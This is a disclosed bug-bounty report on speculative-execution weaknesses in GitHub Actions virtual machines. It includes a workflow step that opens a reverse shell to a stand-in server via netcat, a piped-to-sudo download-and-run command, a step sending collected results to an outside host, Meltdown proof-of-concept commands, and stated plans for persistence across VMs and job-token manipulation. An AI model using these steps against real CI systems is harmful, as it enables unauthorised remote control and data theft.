<img align="left" src="https://user-images.githubusercontent.com/75836834/117618081-4b951d00-b122-11eb-809e-5561b875b37e.png"> 

**Side-channel analysis of Kernel & VM used in Actions Workflows shows vulnerability to Speculative Store Bypass & Rogue System Register Read.**

_A result of conducting exploratory vulnerability research into the Kernel, Virtual machine & Network of the Github Actions systems.  Please [request access here](https://github.com/solo-fish/SSB_GH_ACTIONS) for additional research, code & information._

```bash
Scope:         GitHub.com
Weakness:      Information Disclosure
Severity:      None
Link:          https://hackerone.com/reports/1250018
Date:          2021-07-02 14:51:55 +0000
By:            @bill-ted
CVE IDs:       
```
- - -

### Overview

Github Actions Virtual Machines on Linux Kernel 5.8.0-1036-azure_x86_64 mount with parameters vulnerable to both a Speculative Store Bypass, Variant 4 [CVE-2018-3640](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3640) & Rogue System Register Read, Variant 3a [CVE-2018-3639](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-3640). Both SSB & RSRR are variants of the Meltdown & Spectre Side-Channel Vulnerabilities [Alert (TA18-004A)](https://us-cert.cisa.gov/ncas/alerts/TA18-004A).

I have confirmed these issues in three manner; first, transiently while conducting exploratory vulnerability research, then intentionally with a [purposed tool](https://github.com/speed47/spectre-meltdown-checker) for analyzing [transient execution vulnerabilities](https://en.wikipedia.org/wiki/Transient_execution_CPU_vulnerability) against a systems kernel, and finally with the [official repository for testing meltdown](https://github.com/IAIK/meltdown) released by the researchers whom published [Meltdown: Reading Kernel Memory from User Space](https://meltdownattack.com/meltdown.pdf).

The first confirmation was initially met with my skepticism & acted as the catalyst to look further. Now, as the tests have touched the edge of what I consider reasonably safe & non-invasive do I write this report with strong evidence, a degree of confidence, but ultimately lacking 100% verifiable proof.

## Reproducing all three "confirmations"
> _Attached is DEMO.mp4 demonstrating all three confirmation methods using a reverse shell_

The easiest way is to request [access to this repository](https://github.com/solo-fish/SSB_GH_ACTIONS). Alternatively, **bind a reverse shell** or add these scripts to a **Github Actions workflow**, the latter being less convenient for ad-hoc research.  

To bind a reverse shell you need a network enabled linux environment, all major distributions come with `nc` which can be used to control your Actions VM, on your host run the following:
```bash
$  sudo nc -lvkw 580 MY-SERVER.com 443
> Listening on MY-SERVER.com 443
```
Now we can attach a client to `MY-SERVER.com` & redirect the input it receives to a shell.  In an existing or new github repo add the following workflow step:
```yml
name: reverse-shell
on: workflow_dispatch:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2
      - name: reverse-shell
        run: bash <(nc -v MY-SERVER.com 443)
```
You're done; execute this workflow step & wait for confirmation that the Actions container has connected to your server. Once connected, anything entered in your servers shell will be executed with `bash` on the Actions container.
- - -

## Confirmation 1

While creating iterative patches (example attached) from a myriad of information about the actions kernel I noticed that `/proc/$$/status` contains the vulnerable flag added in [torvalds/linux@d93e5e2](https://github.com/torvalds/linux/commit/d93e5e2d03d4f41dfedb92200a2c0413ab8ee4e7) to alert userspace of the speculative store bypass mitigation status:

```
Speculation_Store_Bypass:	vulnerable
```
> [Read more about the `/proc` filesystem](https://www.kernel.org/doc/html/latest/filesystems/proc.html)

Additionally, the extended feature flags on the cpu-set show that the SSB protections are not enabled & the CPU class is a vulnerable type.
```
   brand = "Intel(R) Xeon(R) CPU E5-2673 v4 @ 2.30GHz"
   extended feature flags (7):
	SSBD: speculative store bypass disable   = false
```

### Reproduce
Execute the following in an Actions VM.
```bash
#!/bin/bash
# Create a directory for your results
results_folder=${1:-"results"}
mkdir -p ${results_folder}

# Write the status for the current & `init` processes
sudo cat /proc/1/status > ${results_folder}/status.proc.1
sudo cat /proc/$$/status > ${results_folder}/status.proc.u

# Grab kernel information about the cpuset
sudo apt install cpuid
sudo cpuid > ${results_folder}/cpu.stats

# Optionally compress & tunnel a tarball to an external host for viewing.
sudo apt install wormhole
tar cf  ${results_folder}.tar.xz ${results_folder}/
wormhole send ${results_folder}.tar.xz

```
Then inspect the output however most convenient, I've attached to this report copies of these outputs (and a few other) from a random actions execution as optional viewing as well.

## Confirmation 2

A more targeted approach, we'll now use [spectre-meltdown-checker](https://github.com/speed47/spectre-meltdown-checker) a repository used to assess a system's resilience against the several [transient execution](https://en.wikipedia.org/wiki/Transient_execution_CPU_vulnerability) CVEs.

The output shows that we're vulnerable to the two CVEs cited in the overview of this report.

```bash
CVE-2018-3640 aka 'Variant 3a, rogue system register read'
	* CPU microcode mitigates the vulnerability:  NO 
> STATUS:  VULNERABLE
  
CVE-2018-3639 aka 'Variant 4, speculative store bypass'
		* Mitigated according to the /sys interface:  NO  (Vulnerable)
		* Kernel supports disabling speculative store bypass (SSB):  YES  (found in /proc/self/status)
		* SSB mitigation is enabled and active:  NO 
> STATUS:  VULNERABLE
...
> SUMMARY: 
	CVE-2017-5753   ->   OK 
	CVE-2017-5715   ->   OK 
	CVE-2017-5754   ->   OK 
**	CVE-2018-3640   ->   KO **
**	CVE-2018-3639   ->   KO **
	CVE-2018-3615   ->   OK 
	CVE-2018-3620   ->   OK 
	CVE-2018-3646   ->   OK 
	CVE-2018-12126  ->   OK 
	CVE-2018-12130  ->   OK 
	CVE-2018-12127  ->   OK 
	CVE-2019-11091  ->   OK 
	CVE-2019-11135  ->   OK 
	CVE-2018-12207  ->   OK 
	CVE-2020-0543   ->   OK
```

### Reproduce
Execute & view the output of this line of bash code in a Github Actions workflow:
```bash
curl -sS https://raw.githubusercontent.com/speed47/spectre-meltdown-checker/master/spectre-m
eltdown-checker.sh | sudo bash
```
Wait, or follow the instructions laid out in the [source repo](https://github.com/speed47/spectre-meltdown-checker), to quote them:
> You never blindly run scripts you downloaded from the Internet, do you?

## Confirmation 3

Now testing with the [official repository](
https://github.com/IAIK/meltdown) written for & cited in [Meltdown: Reading Kernel Memory from User Space](https://meltdownattack.com/meltdown.pdf).

I thought of testing meltdown further, however, after viewing the code & the warnings provided on the repository I deemed it unsafe for both Github's Infrastructure & Users.

>  If you find that a computer is susceptible to the Meltdown bug, you may want to avoid using it as a **multi-user system**. Meltdown breaches the CPU's memory protection. On a machine that is susceptible to the Meltdown bug, one process can read all pages used by other processes or by the kernel. This code is only for testing purposes. Do not run it on any productive systems. Do not run it on any system that might be used by another person or entity.

### Reproduce
Running the first testset from `meltdown`

```
git clone https://github.com/IAIK/meltdown.git
cd meltdown/libkdump
make
sudo make install
cd ..
make
taskset 0x1 ./test
```
We get the correct ouput
```
Expect: Welcome to the wonderful world of microarchitectural attacks
   Got: Welcome to the wonderful world of microarchitectural attacks
```
- - -

## Resources
- https://meltdownattack.com/meltdown.pdf
- https://spectreattack.com/spectre.pdf
- https://www.kernel.org/doc/html/latest/filesystems/proc.html
- https://www.kernel.org/doc/html/latest/admin-guide/cgroup-v1/cpusets.html
- https://www.kernel.org/doc/html/latest/filesystems/index.html
- https://github.com/solo-fish/SSB_GH_ACTIONS
- https://github.com/IAIK/meltdown
- https://github.com/speed47/spectre-meltdown-checker
- https://arxiv.org/abs/1801.01207
- https://us-cert.cisa.gov/ncas/alerts/TA18-141A

## Impact

## Minimum Impact
1. Read arbitrary privileged data. [1]
2. Run older commands speculatively, resulting in cache allocations that could be used to exfiltrate data by standard side-channel methods. [1]

**Can I detect if someone has exploited Meltdown or Spectre against me?**
Probably not. The exploitation does not leave any traces in traditional log files. [2]

1. https://us-cert.cisa.gov/ncas/alerts/TA18-141A
2. https://meltdownattack.com/

## Maximum Impact
Ultimately unknown, I am now looking at dynamically linking executables or a kernel module into the init process of the Actions VM to gain persistent process & network connection across multiple Actions VMs while reporting state from silent side-channel analysis to an external data-store. This (or other methods of physical component identification, such as synchronized reads to the entropy pools), could allow for a network of processes to identify **physical machines** & potentially individual repositories to pull privileged information from. This is actively being investigated. This would require manipulation of the actions job token, among other things. More information at the source repository for this report.

